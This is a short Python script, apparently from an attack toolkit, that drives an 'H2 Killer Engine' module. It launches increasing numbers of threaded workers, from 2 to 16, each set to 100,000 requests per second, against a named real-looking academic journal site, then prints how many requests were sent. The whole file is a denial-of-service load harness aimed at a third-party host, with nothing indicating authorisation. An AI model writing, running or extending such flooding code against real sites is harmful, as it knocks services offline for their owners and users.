"""Test H2 Killer Engine v3 — blast+drain cycle."""
import sys, time, threading, queue
sys.path.insert(0, '.')
from core.attack.engines.h2_killer_engine import run_killer_worker

host = 'ojs.phb.ac.id'

for workers in [2, 4, 8, 12, 16]:
    stop = threading.Event()
    q = queue.Queue()
    results = []
    threads = []
    for wi in range(workers):
        r = {}
        results.append(r)
        t = threading.Thread(
            target=run_killer_worker,
            kwargs=dict(
                target_url='https://%s/' % host,
                rps=100000, duration=5, worker_id=wi,
                stats_queue=q, stop_event=stop,
                host_header=host, connections=4,
                result_dict=r,
            ),
            daemon=True,
        )
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=12)
    stop.set()
    for t in threads:
        t.join(timeout=3)
    total = sum(r.get('sent', 0) for r in results)
    fails = sum(r.get('failed', 0) for r in results)
    rps = total / 5
    print(f'{workers} workers: sent={total}, failed={fails}, RPS={rps:.0f}')
